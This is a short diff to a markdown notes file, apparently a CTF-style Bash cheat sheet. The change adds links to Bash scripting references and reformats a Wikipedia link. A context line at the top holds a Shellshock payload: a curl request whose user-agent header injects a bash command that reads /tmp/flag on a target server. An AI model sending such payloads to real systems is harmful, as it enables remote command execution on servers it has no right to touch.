@@ -67,5 +67,12 @@ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /tmp/flag'" http:/
 
 [nmap http-shellshock](https://nmap.org/nsedoc/scripts/http-shellshock.html)
 
+# Bash Cheatsheets
+##### [Bash scripting cheatsheet](https://devhints.io/bash)
+
 # Bash References
-[Bash (Unix shell)](https://en.wikipedia.org/wiki/Bash_(Unix_shell))
+##### [Bash (Unix shell)](https://en.wikipedia.org/wiki/Bash_(Unix_shell))
+
+##### [Bash Beginner Series #3: Passing Arguments to Bash Scripts](https://linuxhandbook.com/bash-arguments/)
+
+##### [Bash conditional statement](https://linuxhint.com/bash_conditional_statement/)
